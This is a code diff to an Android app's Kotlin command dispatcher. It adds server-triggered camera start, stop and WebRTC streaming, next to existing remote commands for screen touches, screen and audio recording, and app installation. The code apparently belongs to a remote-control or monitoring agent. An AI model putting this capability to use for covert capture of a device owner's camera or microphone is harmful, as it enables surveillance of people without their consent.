@@ -31,6 +31,26 @@ object CommandDispatcher {
                     Log.w(TAG, "webrtc_signal missing data")
                 }
             }
+            "webrtc_answer" -> {
+                // Server sends back answer to camera offer
+                val camera = msg.camera ?: ""
+                val sdp    = msg.sdp ?: ""
+                if (camera.isNotEmpty() && sdp.isNotEmpty()) {
+                    service.handleCameraWebRTCAnswer(camera, sdp)
+                } else {
+                    Log.w(TAG, "webrtc_answer missing camera or sdp")
+                }
+            }
+            "webrtc_ice_candidate" -> {
+                // Server sends ICE candidate for camera (role=publisher means for agent)
+                val camera    = msg.camera ?: ""
+                val candidate = msg.candidate
+                if (camera.isNotEmpty() && candidate != null) {
+                    service.handleCameraWebRTCIce(camera, candidate)
+                } else {
+                    Log.w(TAG, "webrtc_ice_candidate missing camera or candidate")
+                }
+            }
             "screen_touch" -> {
                 val data = msg.data
                 if (data == null) {
@@ -63,6 +83,18 @@ object CommandDispatcher {
                     CommandAction.STOP_RECORDING  -> service.stopRecording()
                     CommandAction.START_AUDIO_RECORDING -> service.startAudioRecording()
                     CommandAction.STOP_AUDIO_RECORDING -> service.stopAudioRecording()
+                    CommandAction.START_CAMERA -> {
+                        val camera = (msg.data as? Map<*, *>)?.get("camera") as? String
+                            ?: msg.camera
+                            ?: "back"
+                        service.startCamera(camera)
+                    }
+                    CommandAction.STOP_CAMERA -> {
+                        val camera = (msg.data as? Map<*, *>)?.get("camera") as? String
+                            ?: msg.camera
+                            ?: "back"
+                        service.stopCamera(camera)
+                    }
                     CommandAction.INSTALL_APP   -> AppCommandHandler.install(msg, service)
                     CommandAction.UNINSTALL_APP -> AppCommandHandler.uninstall(msg, service)
                     CommandAction.START_APP     -> AppCommandHandler.startApp(msg, service)
